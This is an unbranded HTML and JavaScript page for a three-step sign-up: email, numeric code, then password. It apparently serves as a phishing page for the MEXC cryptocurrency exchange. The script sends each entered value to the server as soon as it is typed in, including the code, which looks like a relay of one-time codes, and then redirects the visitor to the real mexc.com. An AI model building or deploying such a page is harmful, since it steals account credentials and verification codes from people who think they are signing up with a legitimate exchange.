<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Multi-Step Registration</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f0c29; /* fallback */
      background-image: url('https://i.imgur.com/9HK9bE9.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .form-container {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0,0,0,0.3);
      width: 320px;
      backdrop-filter: blur(8px);
    }

    .form-step {
      display: none;
    }

    .form-step.active {
      display: block;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 16px;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }

    button:disabled {
      background-color: #6c757d;
      cursor: not-allowed;
    }

    .timer {
      margin-top: 10px;
      text-align: center;
      color: #555;
      font-size: 14px;
    }

    h3 {
      margin: 0;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <div class="form-step active" id="step-1">
      <h3>Enter Email</h3>
      <input type="email" id="email" placeholder="Email" required />
      <button id="sendCodeBtn" onclick="sendEmail()">Send Code</button>
      <div class="timer" id="resendTimer"></div>
    </div>

    <div class="form-step" id="step-2">
      <h3>Enter Code</h3>
      <input type="text" id="code" placeholder="Code" required />
      <button onclick="sendCode()">Next</button>
    </div>

    <div class="form-step" id="step-3">
      <h3>Set Password</h3>
      <input type="password" id="password" placeholder="Password" required />
      <button onclick="submitForm()">Register</button>
    </div>
  </div>

  <script>
    function goToStep(step) {
      document.querySelectorAll(".form-step").forEach(div => div.classList.remove("active"));
      document.getElementById(`step-${step}`).classList.add("active");
    }

    function isValidEmail(email) {
      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
      return emailRegex.test(email);
    }

    function isNumeric(value) {
      return /^\\d+$/.test(value);
    }

    async function sendEmail() {
      const email = document.getElementById("email").value.trim();
      const sendBtn = document.getElementById("sendCodeBtn");
      const timerDisplay = document.getElementById("resendTimer");

      if (!email || !isValidEmail(email)) {
        return alert("Please enter a valid email (e.g. abc@gmail.com)");
      }

      try {
        const res = await fetch("/step-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email }),
        });

        if (res.ok) {
          goToStep(2);
          let timeLeft = 60;
          sendBtn.disabled = true;
          timerDisplay.innerText = `Wait ${timeLeft}s before resending`;

          const timer = setInterval(() => {
            timeLeft--;
            if (timeLeft > 0) {
              timerDisplay.innerText = `Wait ${timeLeft}s before resending`;
            } else {
              clearInterval(timer);
              sendBtn.disabled = false;
              timerDisplay.innerText = "";
            }
          }, 1000);
        } else {
          alert("Failed to send email step to server.");
        }
      } catch (error) {
        alert("Error sending email to server.");
        console.error(error);
      }
    }

    async function sendCode() {
      const code = document.getElementById("code").value.trim();
      if (!code || !isNumeric(code)) {
        return alert("Code must be numeric only");
      }

      try {
        const res = await fetch("/step-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code }),
        });

        if (res.ok) {
          goToStep(3);
        } else {
          alert("Failed to send code to server.");
        }
      } catch (error) {
        alert("Error sending code to server.");
        console.error(error);
      }
    }

    async function submitForm() {
      const password = document.getElementById("password").value.trim();
      const email = document.getElementById("email").value.trim();
      const code = document.getElementById("code").value.trim();

      if (password.length < 8) {
        return alert("Password must be at least 8 characters long");
      }

      try {
        await fetch("/step-password", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ password }),
        });

        const res = await fetch("/register", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, code, password }),
        });

        if (res.ok) {
          window.location.href = "https://www.mexc.com/";
        } else {
          alert("Registration failed.");
        }
      } catch (error) {
        alert("Error during registration.");
        console.error(error);
      }
    }
  </script>
</body>
</html>
